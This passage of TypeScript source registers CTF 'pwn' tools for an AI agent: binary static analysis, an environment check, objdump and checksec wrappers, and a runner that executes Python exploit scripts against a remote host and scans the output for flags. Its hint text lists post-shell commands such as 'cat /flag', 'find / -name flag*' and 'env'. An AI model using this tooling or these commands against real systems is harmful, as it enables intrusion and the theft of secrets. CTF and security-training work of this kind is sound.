              summary.push("动态链接（有 .dynsym/NEEDED，可分析 GOT）");
          }
          sections.push(`\n── 2) 保护推断（checksec 不可用，file/readelf 降级） ──\n` + summary.join("\n"));
        }
      } catch (err: any) {
        sections.push(`\n── 2) 保护推断失败 ──\n${err.message}`);
      }

      // --- 3/7 有趣字符串（本地提取，不依赖 shell strings） ---
      try {
        const es = registry.get("extract_strings");
        if (es) {
          const out = await es.execute({ path, minLength: 5 });
          // extract_strings 会返回总字符串数 + 感兴趣的(默认前100)，直接复用
          sections.push(`\n── 3) 有趣字符串（minLen=5，最多${maxStrings}条） ──\n${out}`);
        }
      } catch (err: any) {
        sections.push(`\n── 3) 字符串提取失败 ──\n${err.message}`);
      }

      // --- 4/7 危险符号（shell objdump -T + grep 常见库调用，若不可用降级 ELF 字节扫描） ---
      const dangerousFunctions = [
        "gets", "strcpy", "strcat", "sprintf", "vsprintf", "vprintf",
        "scanf", "sscanf", "memcpy", "bcopy", "strncpy(慎用)",
        "system", "execve", "execl", "popen", "dlopen",
        "mprotect", "mmap", "malloc", "free", "realloc",
        "read", "write", "recv", "recvfrom", "send", "sendto",
      ];
      try {
        const { spawnSync } = require("child_process") as typeof import("child_process");
        const objT = spawnSync("objdump", ["-T", path], { timeout: 8000, encoding: "utf-8" });
        const dynsym = spawnSync("readelf", ["--dyn-syms", "-W", path], { timeout: 8000, encoding: "utf-8" });
        const combined = (objT.stdout || "") + "\n" + (dynsym.stdout || "");
        const found: string[] = [];
        for (const fn of dangerousFunctions) {
          const re = new RegExp(
            "(^|\\s)" + fn.replace(/[()[\]]/g, "\\$&") + "(@|\\s|$)",
            "m"
          );
          if (re.test(combined)) {
            // 抓取包含该符号的整行（最多3行）
            const lines = combined
              .split("\n")
              .filter((l) => new RegExp("\\b" + fn.replace(/[()[\]]/g, "\\$&") + "\\b").test(l))
              .slice(0, 3);
            found.push(`• ${fn}: ${lines.join(" / ") || "(二进制内符号)"}`);
          }
        }
        // 额外：直接二进制扫描本地定义符号（win/vuln/main/backdoor/flag 等）
        const nameHintPatterns = [
          /\bwin\b/, /\bvuln\b/, /\bbackdoor\b/, /\bsecret\b/, /\bflag_print\b/, /\bprint_flag\b/, /\bget_flag\b/, /\bshell\b/,
        ];
        const buf = fs.readFileSync(path);
        const asciiBuf = buf.toString("latin1");
        const localFns: string[] = [];
        for (const pat of nameHintPatterns) {
          const m = asciiBuf.match(pat);
          if (m) localFns.push("• 二进制内包含候选函数名字符串: " + m[0] + "（很可能是 win/后门函数）");
        }
        sections.push(
          `\n── 4) 危险/可疑符号（共 ${dangerousFunctions.length} 项匹配 ${found.length}） ──\n` +
            (found.length ? found.join("\n") : "(未找到 libc 调用；静态编译或未链接 libc)") +
            (localFns.length ? "\n【关键命名符号】\n" + localFns.join("\n") : "")
        );
      } catch (err: any) {
        sections.push(`\n── 4) 危险符号扫描失败 ──\n${err.message}`);
      }

      // --- 5/7 动态符号表（导入/导出） ---
      try {
        const { spawnSync } = require("child_process") as typeof import("child_process");
        const r = spawnSync("readelf", ["--dyn-syms", "-W", path], { timeout: 8000, encoding: "utf-8" });
        if (r.status === 0 && r.stdout) {
          const lines = r.stdout.split("\n").filter((l) => l.trim() && !l.startsWith("Symbol table") && l.includes("FUNC"));
          sections.push(
            `\n── 5) 动态符号表 .dynsym FUNC（前 60 条，可用于确认导入函数） ──\n` +
              lines.slice(0, 60).join("\n") +
              (lines.length > 60 ? `\n... 共 ${lines.length} 条，显示前60` : "")
          );
        }
      } catch (err: any) {
        sections.push(`\n── 5) dynsym 扫描失败 ──\n${err.message}`);
      }

      // --- 6/7 反汇编关键函数（main / win / vuln / backdoor / _start） ---
      try {
        const { spawnSync } = require("child_process") as typeof import("child_process");
        const keyNames = ["win", "vuln", "main", "backdoor", "secret", "print_flag", "get_flag", "shell", "_start"];
        const disasmParts: string[] = [];
        for (const fn of keyNames) {
          const r = spawnSync(
            "objdump",
            ["-d", "--disassembler-options=intel", "-M", "intel", `--disassemble=${fn}`, path],
            { timeout: 10000, encoding: "utf-8" }
          );
          if (r.status === 0 && r.stdout) {
            const out = r.stdout.split("\n").filter((l) => l.trim());
            // 找 <fn>: 作为锚点开始，取 disassembleBytes / 4 行（一条指令 ~4-16 字节）
            const startIdx = out.findIndex((l) => new RegExp("<" + fn + ">").test(l));
            if (startIdx >= 0) {
              const snippet = out.slice(startIdx, startIdx + Math.max(40, Math.floor(disassembleBytes / 8)));
              disasmParts.push(`\n▸ <${fn}> 反汇编 (${snippet.length} 行):\n` + snippet.join("\n"));
            }
          }
        }
        if (disasmParts.length) {
          sections.push(`\n── 6) 关键函数反汇编（Intel 语法） ──` + disasmParts.join("\n"));
        } else {
          // 系统无 objdump 或函数名无匹配：fallback 用 shell 跑 objdump -d -j .text 截前 80 行
          const r2 = spawnSync("objdump", ["-d", "-j", ".text", "--disassembler-options=intel", path], { timeout: 10000, encoding: "utf-8" });
          if (r2.status === 0 && r2.stdout) {
            const lines = r2.stdout.split("\n").filter((l) => l.trim());
            sections.push(
              `\n── 6) .text 段反汇编开头 (系统无 win/vuln 符号，截取前 80 行供手动定位) ──\n` +
                lines.slice(0, 80).join("\n")
            );
          }
        }
      } catch (err: any) {
        sections.push(`\n── 6) 反汇编失败 ──\n${err.message}`);
      }

      // --- 7/7 GOT / 重定位（ELF 32/64 用 readelf -r / objdump -R） ---
      try {
        const { spawnSync } = require("child_process") as typeof import("child_process");
        const r = spawnSync("readelf", ["-r", "-W", path], { timeout: 8000, encoding: "utf-8" });
        if (r.status === 0 && r.stdout) {
          const rel = r.stdout
            .split("\n")
            .filter((l) => l.trim() && /JUMP_SLOT|GLOB_DAT|RELATIVE/.test(l));
          sections.push(
            `\n── 7) GOT/重定位条目（JUMP_SLOT=plt 间接调用，GLOB_DAT=数据，前 80 条） ──\n` +
              rel.slice(0, 80).join("\n") +
              (rel.length > 80 ? `\n... 共 ${rel.length} 条` : "")
          );
        }
      } catch (err: any) {
        sections.push(`\n── 7) GOT 扫描失败 ──\n${err.message}`);
      }

      return header + sections.join("\n") + "\n" + "=".repeat(64) + "\n📌 以上信息已一次性采集。下一步建议先调用 pwn_check_env 确认本机是否能直接运行该 ELF（macOS 上跑 Linux ELF 会 Exec format error，需打远程或装 qemu-user），再通过 pwn_run_exploit 一次性执行交互脚本，避免反复手写 socket 绕 shell 转义。";
    },
  });

  /**
   * pwn_check_env：一次性检查本机 PWN 环境兼容性。
   * 痛点：macOS 上直接跑 Linux ELF → OSError Exec format error → agent 反复 chmod +x 没用。
   * 输出：OS/arch、pwntools 安装、qemu-user、给定 ELF 的 architecture/OS ABI 与本机匹配度、建议。
   */
  registry.register({
    name: "pwn_check_env",
    description:
      "一次性 PWN 环境检查：OS/架构/pwntools/qemu-user/ELF 本地兼容性识别。macOS 跑 Linux ELF 会 Exec format error，调此工具立刻知道为什么不能本地跑 + 怎么处理（qemu / 转远程）",
    parameters: z.object({
      binary: z.string().optional().describe("本地二进制路径，可选；提供时会额外解析 ELF header 对比本机架构"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const lines: string[] = [];
      const binary = args && typeof args.binary === "string" ? args.binary.trim() : "";

      lines.push("[PWN环境检查]");
      lines.push("─".repeat(60));

      // 1) 本机 OS / CPU 架构
      lines.push("  操作系统: " + process.platform + "  " + process.version);
      lines.push("  Node arch : " + process.arch);
      try {
        const os = require("os");
        lines.push("  主机     : " + os.type() + " " + os.release() + "  cores=" + os.cpus().length);
      } catch {}

      // 2) python3 与 pwntools
      const { spawnSync } = require("child_process") as typeof import("child_process");
      const pyVer = spawnSync("python3", ["-c", "import sys; print(sys.version.split()[0])"], { timeout: 5000, encoding: "utf-8" });
      if (pyVer.status === 0) {
        lines.push("  python3  : " + pyVer.stdout.trim());
        const pwn = spawnSync("python3", ["-c", "import pwn; print(getattr(pwn,'__version__','installed(no __version__)'))"], { timeout: 10000, encoding: "utf-8" });
        lines.push("  pwntools : " + (pwn.status === 0 ? pwn.stdout.trim() : "❌ 未安装（pip install pwntools 可大幅简化远程交互）"));
      } else {
        lines.push("  python3  : ❌ 未找到 (status=" + pyVer.status + " stderr=" + (pyVer.stderr || "").trim().slice(0, 80) + ")");
      }

      // 3) qemu-user（跨架构跑 ELF 必备）
      const qemuList = ["qemu-x86_64-static", "qemu-i386-static", "qemu-x86_64", "qemu-aarch64-static", "qemu-arm-static"];
      const foundQemu: string[] = [];
      for (const q of qemuList) {
        const r = spawnSync("which", [q], { timeout: 3000, encoding: "utf-8" });
        if (r.status === 0) foundQemu.push(q + " -> " + r.stdout.trim());
      }
      if (foundQemu.length) lines.push("  qemu-user: ✅ 已安装:\n" + foundQemu.map((x) => "    • " + x).join("\n"));
      else lines.push("  qemu-user: ❌ 未安装（macOS brew install qemu / Linux apt install qemu-user-static）");

      // 4) 给定 ELF header 对比
      if (binary) {
        lines.push("");
        lines.push("── 二进制兼容性（" + binary + "）──");
        let elfBuf: Buffer | null = null;
        try {
          elfBuf = fs.readFileSync(binary);
        } catch (err: any) {
          lines.push("  ❌ 读文件失败: " + err.message);
          elfBuf = null;
        }
        if (elfBuf) {
          if (elfBuf[0] === 0x7f && elfBuf[1] === 0x45 && elfBuf[2] === 0x4c && elfBuf[3] === 0x46) {
            const ei_class = elfBuf[4]; // 1=32 2=64
            const ei_data = elfBuf[5];  // 1=LE 2=BE
            const e_machine = elfBuf.readUInt16LE(18);
            const bits = ei_class === 1 ? "32-bit" : ei_class === 2 ? "64-bit" : "?";
            const endian = ei_data === 1 ? "Little Endian" : ei_data === 2 ? "Big Endian" : "?";
            const machineMap: Record<number, string> = {
              0x03: "x86 (i386)", 0x3e: "x86_64 (amd64)", 0xb7: "ARM aarch64", 0x28: "ARM (armhf)",
              0xf3: "RISC-V 32", 0xf7: "RISC-V 64",
            };
            const mach = machineMap[e_machine] || `UNKNOWN(0x${e_machine.toString(16)})`;
            lines.push("  ELF class : " + bits);
            lines.push("  字节序    : " + endian);
            lines.push("  机器架构  : " + mach);

            const nodeArch = process.arch; // 'x64' | 'arm64' | 'ia32' ...
            const sameArch =
              (e_machine === 0x3e && nodeArch === "x64") ||
              (e_machine === 0x03 && nodeArch === "ia32") ||
              (e_machine === 0xb7 && nodeArch === "arm64");

            if (process.platform !== "linux") {
              lines.push("  ⚠️ 宿主系统是 " + process.platform + "，不是 Linux");
              lines.push("     → ELF (Linux) 无法本机直接执行（会报 Exec format error）");
              if (foundQemu.length && (e_machine === 0x3e || e_machine === 0x03)) {
                lines.push("     ✅ 可用 qemu 运行: qemu-" + (e_machine === 0x3e ? "x86_64" : "i386") + "-static " + binary);
              } else {
                lines.push("     建议：改打远程（题目一般有 nc 地址），或安装 qemu-user / 开 Linux 虚拟机");
              }
            } else if (!sameArch) {
              lines.push("  ⚠️ 宿主 arch=" + nodeArch + " 与 ELF machine=" + mach + " 不匹配");
              const qemuBin =
                e_machine === 0x3e ? "qemu-x86_64-static" :
                e_machine === 0x03 ? "qemu-i386-static" :
                e_machine === 0xb7 ? "qemu-aarch64-static" :
                e_machine === 0x28 ? "qemu-arm-static" : null;
              if (qemuBin && foundQemu.some((x) => x.startsWith(qemuBin))) {
                lines.push("     ✅ 可用 " + qemuBin + " " + binary + " 本地执行");
              } else {
                lines.push("     建议：安装 " + (qemuBin || "qemu-user") + " 后再本地跑，或直接打远程");
              }
            } else {
              lines.push("  ✅ 宿主与 ELF 架构/系统匹配，可直接 ./binary 执行");
              if (process.getuid && process.getuid() === 0) {
                lines.push("  ⚠️ 当前是 root，ASLR 行为与远程 CTF 容器可能不同");
              }
            }
          } else if (elfBuf[0] === 0x4d && elfBuf[1] === 0x5a) {
            lines.push("  文件类型 : PE (Windows)");
            if (process.platform !== "win32") lines.push("  ⚠️ 宿主非 Windows，需 wine / 开 Windows 环境，或直接打远程");
            else lines.push("  ✅ 宿主是 Windows，可本地执行调试");
          } else if (elfBuf[0] === 0xcf && elfBuf[1] === 0xfa) {
            lines.push("  文件类型 : Mach-O 64 (macOS)");
            if (process.platform === "darwin") lines.push("  ✅ 宿主是 macOS，可本地执行调试");
            else lines.push("  ⚠️ 宿主非 macOS，Mach-O 无法本地执行");
          } else {
            lines.push("  ⚠️ 未知二进制格式（magic: " + elfBuf.slice(0, 4).toString("hex") + "），可能不是可执行文件或已加密");
          }
        }
      }

      lines.push("");
      lines.push("─".repeat(60));
      lines.push("📌 本地跑不了（Exec format error / arch 不匹配）时：");
      lines.push("   1) 直接打远程（题目给了 nc 地址时首选，使用 pwn_run_exploit）");
      lines.push("   2) macOS 装 qemu-user: brew install qemu 后用 qemu-x86_64-static ./binary");
      lines.push("   3) 起 Linux 容器/VM: docker run -it -v $PWD:/w ubuntu:22.04");
      lines.push("");
      lines.push("📌 交互脚本调试慢时：用 pwn_run_exploit 把 pwntools/socket 代码直接传参执行");
      lines.push("   代码不经过 shell → %N$p / \\xNN 不会被解析破坏，省掉 file_write_real + command_exec 两次调用");

      return lines.join("\n");
    },
  });

  /**
   * pwn_run_exploit：把 Python exploit 代码落盘 → python3 执行 → 捕获 stdout+stderr+returnCode+超时。
   * 设计痛点：LLM 之前写 exploit = file_write_real + command_exec 两步，且 python3 -c 里 $ / \n / 引号被 shell 破坏。
   * 此工具一步到位，且 stdout 自动显示字节流 repr，便于观察 %p 展开情况。
   */
  registry.register({
    name: "pwn_run_exploit",
    description:
      "一步执行 Python/pwntools 交互脚本：代码直接写入临时文件再调用 python3 执行（不经过 shell），彻底避免 $/\\x/引号转义破坏 payload。解决远程交互调试慢、格式化字符串$p被shell吞、本地 Exec format 报错。代码可直接写 socket/pwntools 两种风格",
    parameters: z.object({
      script: z.string().describe("Python 源代码字符串，可直接 import socket/pwn；含 %N$p、\\x 字节都不会被 shell 转义；文件会自动落盘执行。可使用 host/port 变量模板：写 {HOST} 和 {PORT}，会被替换为 host/port 参数"),
      host: z.string().optional().describe("远程靶机 IP/域名；若提供则脚本中 {HOST} 占位符替换"),
      port: z.number().optional().describe("远程靶机端口；若提供则脚本中 {PORT} 占位符替换"),
      timeout: z.number().optional().describe("脚本整体执行超时毫秒，默认 30000（30 秒），最长 120000"),
      binaryBase64: z.string().optional().describe("可选：本地二进制 base64 内容，执行前解码到临时目录，脚本中可用 {BINARY} 占位符指向它（用于本地调试）"),
      cwd: z.string().optional().describe("可选：脚本执行工作目录，默认系统 tmpdir"),
      flagRegex: z.string().optional().describe("可选：自定义 flag 正则表达式（JavaScript 语法），例如 ctfhub\\\\{[^}]+\\\\}。默认内置 flag{}/CTF{}/ctfhub{}/picoCTF{}/FLAG{}/HITS{} 等常见平台格式。工具会自动扫 stdout+stderr 中的匹配，找到则高亮 [FLAG FOUND]，未找到给出明确调试建议"),
    }),
    category: "pwn",
    requirePermission: true, // 执行任意 Python 脚本，需要授权
    execute: async (args: any) => {
      const os = require("os");
      const path = require("path");
      const crypto = require("crypto");
      const { execFile } = require("child_process") as typeof import("child_process");

      const scriptRaw = typeof args.script === "string" ? args.script : "";
      const timeoutMs = Math.min(Math.max(Number(args.timeout) || 30000, 1000), 120000);
      const cwd = typeof args.cwd === "string" && args.cwd ? args.cwd : os.tmpdir();

      // 常见 CTF 平台 flag 格式（用户可通过 flagRegex 追加自定义正则）
      const defaultFlagPatterns: RegExp[] = [
        /flag\{[^}\n\r]{1,128}\}/i,
        /CTF\{[^}\n\r]{1,128}\}/,
        /ctfhub\{[^}\n\r]{1,128}\}/,
        /picoCTF\{[^}\n\r]{1,128}\}/,
        /FLAG\{[^}\n\r]{1,128}\}/,
        /HITS\{[^}\n\r]{1,128}\}/,
        /DASCTF\{[^}\n\r]{1,128}\}/,
        /[A-Za-z0-9_]{1,32}\{[^}\n\r]{3,128}\}/, // 兜底：<平台名>{<内容>}
      ];
      const flagPatterns = [...defaultFlagPatterns];
      if (typeof args.flagRegex === "string" && args.flagRegex.trim()) {
        try {
          flagPatterns.push(new RegExp(args.flagRegex.trim(), "gim"));
        } catch (err: any) {
          return "[pwn_run_exploit] flagRegex 正则语法错误: " + err.message + " （若包含反斜杠请转义，如 ctfhub\\\\{[^}]+\\\\}）";
        }
      }

      if (!scriptRaw.trim()) return "[pwn_run_exploit] 错误: script 为空";

      // 1) 若提供 binaryBase64 → 解码到临时文件
      let binaryPath: string | null = null;
      if (typeof args.binaryBase64 === "string" && args.binaryBase64.trim()) {
        try {
          const binBuf = Buffer.from(args.binaryBase64.trim(), "base64");
          binaryPath = path.join(cwd, "flagent_binary_" + crypto.randomBytes(4).toString("hex"));
          fs.writeFileSync(binaryPath as string, binBuf);
          try { fs.chmodSync(binaryPath as string, 0o755); } catch {}
        } catch (err: any) {
          return "[pwn_run_exploit] binaryBase64 解码失败: " + err.message;
        }
      }

      // 2) 占位符替换
      let scriptText = scriptRaw;
      if (typeof args.host === "string" && args.host) {
        scriptText = scriptText.replace(/\{HOST\}/g, JSON.stringify(args.host));
      }
      if (typeof args.port === "number") {
        scriptText = scriptText.replace(/\{PORT\}/g, String(args.port));
      }
      if (binaryPath) {
        scriptText = scriptText.replace(/\{BINARY\}/g, JSON.stringify(binaryPath));
      }

      // 3) 写脚本文件（临时）
      const scriptPath = path.join(cwd, "flagent_exploit_" + crypto.randomBytes(6).toString("hex") + ".py");
      try {
        fs.writeFileSync(scriptPath, scriptText, "utf-8");
      } catch (err: any) {
        return "[pwn_run_exploit] 写脚本失败: " + err.message;
      }

      // 4) 用 execFile 执行（不经过 shell → payload 不被破坏）
      const out: string[] = [];
      out.push("[pwn_run_exploit] 执行脚本: " + scriptPath);
      out.push("  host/port: " + (args.host || "(无)") + ":" + (args.port || "(无)"));
      out.push("  timeout  : " + timeoutMs + "ms");
      if (binaryPath) out.push("  binary   : " + binaryPath + " (" + (fs.statSync(binaryPath).size) + " bytes)");
      out.push("─".repeat(60));
      out.push("—— 脚本内容预览（前 20 行）——");
      out.push(scriptText.split("\n").slice(0, 20).map((l: string, i: number) => String(i + 1).padStart(3) + "| " + l).join("\n"));
      const restLines = scriptText.split("\n").length - 20;
      if (restLines > 0) out.push("... 还有 " + restLines + " 行（完整脚本已落盘）");
      out.push("─".repeat(60));
      out.push("—— STDOUT ——");

      try {
        const result = await new Promise<{ code: number; stdout: Buffer; stderr: Buffer; signal: NodeJS.Signals | null }>((resolve, reject) => {
          let done = false;
          const child = execFile("python3", [scriptPath], {
            cwd,
            timeout: timeoutMs,
            maxBuffer: 10 * 1024 * 1024, // 10MB，%4660c 会有大量输出
            encoding: null, // 保留 Buffer，避免字节乱码
            // env 继承父进程环境（保留 DASHSCOPE 等，pwntools 可能用到 PATH）
          }, (err, stdout, stderr) => {
            if (done) return;
            done = true;
            if (err) {
              // execFile 不把超时算 reject，保留 code/stdout/stderr
              resolve({
                code: (err as any).code || (typeof (err as any).status === "number" ? (err as any).status : (err as any).killed ? -1 : 1),
                stdout: Buffer.isBuffer(stdout) ? stdout : Buffer.from(String(stdout || "")),
                stderr: Buffer.isBuffer(stderr) ? stderr : Buffer.from(String(stderr || "")),
                signal: (err as any).signal || null,
              });
            } else {
              resolve({
                code: 0,
                stdout: Buffer.isBuffer(stdout) ? stdout : Buffer.from(String(stdout || "")),
                stderr: Buffer.isBuffer(stderr) ? stderr : Buffer.from(String(stderr || "")),
                signal: null,
              });
            }
          });
          // 安全：超时兜底 kill
          setTimeout(() => {
            if (done) return;
            done = true;
            try { child.kill("SIGKILL"); } catch {}
            reject(new Error("执行进程未在 " + timeoutMs + "ms 内退出，已 SIGKILL"));
          }, timeoutMs + 5000);
        });

        const showBuf = (label: string, buf: Buffer) => {
          out.push("—— " + label + " (返回 " + buf.length + " bytes) ——");
          if (buf.length === 0) { out.push("(空)"); return; }
          // 先原样转 UTF-8 显示文本，尾部附 bytes repr（格式化字符串 %p 等需要看字节）
          const text = buf.toString("utf-8");
          if (text.length > 4096) {
            out.push(text.slice(0, 4096) + "\n...(前 4KB，共 " + buf.length + " 字节)");
          } else {
            out.push(text);
          }
          out.push("—— bytes 尾部（repr，最后 64 字节）——");
          const tail = buf.slice(-64);
          out.push(reprBuffer(tail) + (buf.length > 64 ? ` (总 ${buf.length} B)` : ""));
        };
        showBuf("STDOUT", result.stdout);
        showBuf("STDERR", result.stderr);
        out.push("─".repeat(60));
        out.push("返回码: " + result.code + (result.signal ? "  signal: " + result.signal : ""));
        if (result.code !== 0 || result.signal) {
          out.push("💡 脚本失败排查：");
          out.push("   1) Python 语法错误 → 看 STDERR");
          out.push("   2) 远端提前 EOF → 可能 payload 长度算错/靶机重启；检查 bytes 尾部看对方发了什么");
          out.push("   3) pwntools 未安装 → pip install pwntools（或改用 socket 风格）");
        }

        // === Flag 自动扫描：避免 Agent 漏读导致"Flag: 无" ===
        // 把 stdout + stderr 合并，用每个正则（global）抽匹配，去重后输出
        const combined = Buffer.concat([result.stdout, result.stderr]);
        const combinedText = combined.toString("utf-8");
        const combinedRaw: string = combined.toString("latin1"); // 兜底：latin1 每个 byte 都可逆
        const foundFlags: string[] = [];
        const seen = new Set<string>();
        for (const re of flagPatterns) {
          try {
            const globalRe = re.flags.includes("g") ? re : new RegExp(re.source, (re.flags || "") + "g");
            const haystacks = [combinedText, combinedRaw];
            for (const hay of haystacks) {
              let m: RegExpExecArray | null;
              while ((m = globalRe.exec(hay)) !== null) {
                const candidate = m[0];
                if (!seen.has(candidate)) {
                  seen.add(candidate);
                  // 过滤掉明显是正则本身/脚本里例子写的"伪flag"，如 payload = b'flag{' 或 长度过短
                  if (candidate.length >= 6 && !/\{[^}]{0,1}\}/.test(candidate)) {
                    foundFlags.push(candidate);
                  }
                }
                if (!globalRe.global) break;
                if (m.index === globalRe.lastIndex) globalRe.lastIndex++;
                if (foundFlags.length >= 12) break;
              }
              if (foundFlags.length >= 12) break;
            }
          } catch {}
        }
        out.push("─".repeat(60));
        if (foundFlags.length > 0) {
          out.push("🎯 [FLAG FOUND] 在 stdout/stderr 中检测到 " + foundFlags.length + " 条 flag 候选：");
          for (const f of foundFlags) out.push("    • " + f);
          out.push("  以上为原始匹配，请挑与题目平台（如 ctfhub{ } / flag{ }）一致的条目作为最终答案。");
        } else {
          out.push("⚠️  [NO FLAG FOUND] 本次 exploit 未检测到 flag{/ctfhub{/CTF{ 等前缀。下一步建议：");
          out.push("   1) 查看 bytes 尾部：确认 win 条件触发了吗？出现 uid= 或 shell 提示符 (/#) 了吗？若没有 = payload 不对 → 重新算偏移/写入字节数");
          out.push("   2) 如果出现 shell 提示符但没 flag → 请在 payload 后追加多条读取命令：cat flag  cat /flag  cat *.txt  ls -la /  find / -name flag* 2>/dev/null  env （逐条发送）");
          out.push("   3) 如果格式化字符串展开不完整 → 改 payload 分两字节 %hhn 或逐字节写，一次只写 1~2 字节避免 %4660c 导致超时/服务端 buffer 满");
          out.push("   4) 自定义平台格式：传 flagRegex='平台名\\\\{[^}]+\\\\}' 再跑一次（题目有明确 flag 前缀时优先用此参数）");
          out.push("   5) 服务端单次输出被截断：加 recv() 循环 + 更长 sleep(1~2 秒)，或启用 pwntools 的 interactive() 手动交互后 cat flag");
        }
      } catch (err: any) {
        out.push("❌ 执行异常: " + err.message);
      } finally {
        // 清理临时文件（避免 /tmp 堆垃圾），binary 若也在 cwd 且是我们创建的也删
        try { fs.unlinkSync(scriptPath); } catch {}
        if (binaryPath) { try { fs.unlinkSync(binaryPath); } catch {} }
      }
      return out.join("\n");
    },
  });

  // ========= 专业反汇编工具增强（优先调用系统专业工具，不存在时降级/提示） =========

  registry.register({
    name: "pwn_objdump",
    description:
      "GNU objdump 完整反汇编/符号/节数据。专业级：支持指定函数/地址范围反汇编；系统无 objdump 时给出降级提示。比自制 disassemble 准确得多。",
    parameters: z.object({
      path: z.string().describe("ELF/PE/Mach-O 二进制路径"),
      mode: z
        .enum(["disasm", "disasm-func", "disasm-range", "syms", "dyn-syms", "sections", "relocs", "headers"])
        .default("disasm")
        .describe(
          "disasm=全反汇编(-d)/disasm-func=指定函数反汇编/disasm-range=地址范围/syms=符号表(-t)/dyn-syms=动态符号(-T)/sections=节信息(-h)/relocs=重定位(-R)/headers=全部头部(-x)"
        ),
      symbol: z.string().optional().describe("mode=disasm-func 时必填：函数名（如 main、win、vuln）"),
      startAddr: z.string().optional().describe("mode=disasm-range 时：起始地址，如 0x401000"),
      endAddr: z.string().optional().describe("mode=disasm-range 时：结束地址"),
      intelSyntax: z.boolean().default(true).describe("x86 时是否使用 Intel 语法（默认 true）"),
      maxLines: z.number().min(50).max(5000).default(1500).describe("输出超过此时在末尾截断，避免 LLM 上下文爆炸"),
    }),
    category: "pwn",
    concurrent: true,
    requirePermission: true,
    execute: async (args: any) => {
      const { path, mode, symbol, startAddr, endAddr, intelSyntax, maxLines } = args;
      if (!fs.existsSync(path)) return `❌ 文件不存在: ${path}`;
      const { spawnSync } = require("child_process") as typeof import("child_process");

      // 检查 objdump 是否存在
      const which = spawnSync("which", ["objdump"], { timeout: 3000, encoding: "utf-8" });
      if (which.status !== 0 || !which.stdout.trim()) {
        return (
          `⚠️  系统未安装 objdump（属于 binutils 包）。\n` +
          `  macOS: brew install binutils  （使用 gobjdump，若需手工替换）\n` +
          `  Ubuntu/Debian: sudo apt install binutils\n` +
          `  RHEL/CentOS: sudo yum install binutils\n` +
          `  也可先使用 pwn_static_analysis(path) 工具获得基础信息。`
        );
      }

      const args_: string[] = [];
      switch (mode) {
        case "disasm":
          args_.push("-d");
          if (intelSyntax) args_.push("-M", "intel");
          break;
        case "disasm-func":
          if (!symbol) return `❌ mode=disasm-func 必须传 symbol 参数`;
          args_.push(`--disassemble=${symbol}`);
          if (intelSyntax) args_.push("-M", "intel");
          break;
        case "disasm-range": {
          if (!startAddr) return `❌ mode=disasm-range 必须传 startAddr`;
          args_.push("-d");
          if (intelSyntax) args_.push("-M", "intel");
          // objdump 没有原生范围参数，用 start-stop-addr 可选
          args_.push(`--start-address=${startAddr}`);
          if (endAddr) args_.push(`--stop-address=${endAddr}`);
          break;
        }
        case "syms": args_.push("-t"); break;
        case "dyn-syms": args_.push("-T"); break;
        case "sections": args_.push("-h"); break;
        case "relocs": args_.push("-R"); break;
        case "headers": args_.push("-x"); break;
      }
      args_.push(path);

      const r = spawnSync("objdump", args_, { timeout: 30000, encoding: "utf-8", maxBuffer: 10 * 1024 * 1024 });
      let stdout = r.stdout || "";
      const stderr = r.stderr || "";

      // 行数截断
      const lines = stdout.split("\n");
      let truncated = "";
      if (lines.length > maxLines) {
        truncated = `\n... (输出共 ${lines.length} 行，截断前 ${maxLines} 行；后续可改用 disasm-func 或 disasm-range 范围反汇编)`;
        stdout = lines.slice(0, maxLines).join("\n");
      }

      const header =
        `[pwn_objdump mode=${mode}${symbol ? " symbol=" + symbol : ""}${startAddr ? " range=" + startAddr + "~" + (endAddr || "?") : ""}]\n`;
      const tail = stderr ? `\n[STDERR] ${stderr.slice(0, 400)}\n` : "";
      if (r.status !== 0) {
        return header + `❌ objdump 退出码 ${r.status}${tail}` + (stdout ? `\n${stdout.slice(0, 2000)}` : "");
      }
      return header + stdout + truncated + tail;
    },
  });

  registry.register({
    name: "pwn_checksec",
    description:
      "专业级 checksec：优先使用 pwntools 的 checksec --format=json 输出 RELRO/Stack Canary/NX/PIE/RPATH/RUNPATH/FORTIFY/fortify_source 全量保护；否则用 readelf 组合；比 binary_analysis 的粗略检测更准。",
    parameters: z.object({
      path: z.string().describe("ELF/二进制路径"),
    }),
    category: "pwn",
    concurrent: true,
    requirePermission: true,
    execute: async (args: any) => {
      const { path } = args;
      if (!fs.existsSync(path)) return `❌ 文件不存在: ${path}`;
      const { spawnSync } = require("child_process") as typeof import("child_process");
      const out: string[] = [];

      // 1) 优先 pwntools checksec（最专业）
      const whichCS = spawnSync("which", ["checksec"], { timeout: 3000, encoding: "utf-8" });
      if (whichCS.status === 0 && whichCS.stdout.trim()) {
        const r = spawnSync("checksec", [`--file=${path}`, "--format=json"], {
          timeout: 15000,
          encoding: "utf-8",
        });
        if (r.status === 0 && r.stdout.trim()) {
          out.push("✅ 使用 pwntools checksec:");
          try {
            const json = JSON.parse(r.stdout);
            // json 结构: { "<path>": { "relro":"Full RELRO", ... } }
            const key = Object.keys(json)[0] || path;
            const v: Record<string, any> = json[key] || {};
            for (const k of Object.keys(v)) {
              out.push(`  ${String(k).padEnd(20)} : ${JSON.stringify(v[k])}`);
            }
          } catch {
            out.push("  (JSON 解析失败，原始输出:)");
            out.push(r.stdout.slice(0, 4000));
          }
          // 附人读版本：再跑一次无 format 的
          const r2 = spawnSync("checksec", [`--file=${path}`], { timeout: 15000, encoding: "utf-8" });
          if (r2.status === 0) out.push("\n人读输出:\n" + r2.stdout.trim());
          return out.join("\n");
        } else {
          out.push(
            `⚠️  checksec 调用失败 (exit=${r.status})，fallback 到 readelf。` +
              `安装 pwntools 可得到更全的检测结果：pip install pwntools`
          );
        }
      } else {
        out.push(
          "ℹ️  未检测到 pwntools 的 checksec。建议: pip install pwntools（会附带 checksec 命令）。Fallback 到 readelf 组合结果："
        );
      }

      // 2) fallback：组合 readelf
      const readelfL = spawnSync("readelf", ["-l", path], { timeout: 5000, encoding: "utf-8" });
      const readelfD = spawnSync("readelf", ["-d", path], { timeout: 5000, encoding: "utf-8" });
      const readelfS = spawnSync("readelf", ["-S", path], { timeout: 5000, encoding: "utf-8" });
      const file = spawnSync("file", [path], { timeout: 5000, encoding: "utf-8" });
      const symbols = spawnSync("readelf", ["--dyn-syms", "-W", path], { timeout: 5000, encoding: "utf-8" });

      out.push("\n[Fallback readelf 检测]");
      if (file.status === 0) out.push("file: " + file.stdout.trim().split("\n")[0]);

      // NX（GNU_STACK RWE）
      if (readelfL.status === 0) {
        const m = readelfL.stdout.match(/GNU_STACK[^\n]*/);
        if (m) {
          const line = m[0];
